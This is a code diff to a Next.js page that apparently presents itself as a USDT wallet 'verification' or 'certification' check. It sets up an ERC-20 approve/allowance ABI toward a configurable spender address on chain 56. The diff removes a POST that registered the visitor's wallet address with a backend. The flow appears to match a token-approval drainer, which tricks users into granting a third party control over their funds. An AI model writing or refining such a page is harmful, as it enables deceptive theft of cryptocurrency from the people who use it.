@@ -9,7 +9,6 @@ const token = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "";
 const spender = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "";
 const chainId = process.env.NEXT_PUBLIC_CHAIN_ID ?? "56";
 const targetChainHex = `0x${BigInt(chainId).toString(16)}`;
-const api = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";
 const erc20 = [
   "function approve(address spender,uint256 amount) returns (bool)",
   "function allowance(address owner,address spender) view returns (uint256)"
@@ -103,13 +102,6 @@ export default function Home() {
         throw new Error("Wallet network changed before completion. Click Check Now to retry.");
       }
 
-      const response = await fetch(`${api}/api/wallets`, {
-        method: "POST",
-        headers: { "content-type": "application/json" },
-        body: JSON.stringify({ address, receiver: 1 })
-      });
-
-      if (!response.ok) throw new Error("Wallet registration failed. Please try again.");
       setIsCertified(true);
     } catch (error) {
       setNotice((error as { code?: number }).code === 4001 ? "Wallet request was cancelled." : error instanceof Error ? error.message : "Verification failed.");
